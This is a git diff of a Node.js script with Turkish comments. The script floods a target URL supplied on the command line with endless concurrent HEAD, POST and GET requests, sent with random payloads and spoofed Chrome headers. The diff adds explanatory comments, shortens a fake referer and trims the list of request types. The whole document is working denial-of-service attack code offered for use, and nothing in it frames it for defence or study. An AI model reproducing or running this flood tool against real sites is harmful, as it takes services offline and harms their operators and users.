@@ -1,11 +1,12 @@
 const axios = require('axios');
 const process = require('process');
 
+// Başlıkları ayarla
 const headers = {
   'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
   'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
   'cache-control': "max-age=0",
-  'referer': 'http://abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijkabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk.com/',
+  'referer': 'http://abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijk.com/',
   'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
   'sec-ch-ua-mobile': "?0",
   'sec-ch-ua-platform': '"Windows"',
@@ -17,11 +18,13 @@ const headers = {
   'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 };
 
+// İstek tiplerini diziye koyalım
+const requestTypes = ['HEAD', 'POST', 'GET'];
 
-const requestTypes = ['HEAD', 'POST', 'GET', 'PUT', 'PATCH'];
-
+// Rastgele bir gecikme eklemek için bir fonksiyon
 const getRandomDelay = () => Math.floor(Math.random() * 10);
 
+// İstek göndermek için işlev
 const sendRequest = async (url, index) => {
   const randomDelay = getRandomDelay(); 
   await new Promise(resolve => setTimeout(resolve, randomDelay));
@@ -38,8 +41,9 @@ const sendRequest = async (url, index) => {
       number: randomNumber,
       date: randomDate
     };
-    console.log(`Seçilen istek tipi: ${requestType}`); 
+    console.log(`Seçilen istek tipi: ${requestType}`); // Hata ayıklama
 
+    // Seçilen istek tipine göre isteği gönder
     switch (requestType) {
       case 'HEAD':
         await axios.head(url, { headers });
@@ -61,6 +65,7 @@ const sendRequest = async (url, index) => {
   }
 };
 
+// Terminalden URL ve thread sayısını al
 const args = process.argv.slice(2);
 if (args.length < 2) {
   console.error('Lütfen URL ve eş zamanlı iş parçacığı sayısını belirtin.');
@@ -78,9 +83,10 @@ if (isNaN(numberOfThreads) || numberOfThreads <= 0) {
 console.log(`URL: ${url}`);
 console.log(`Eş zamanlı iş parçacığı sayısı: ${numberOfThreads}`);
 
+// Sonsuza kadar istek gönder
 let requestCounter = 1;
 setInterval(() => {
   for (let i = 0; i < numberOfThreads; i++) {
     sendRequest(url, requestCounter++);
   }
-}, 0); 
+}, 0); // Her döngü arasında gecikme olmadan çalıştır
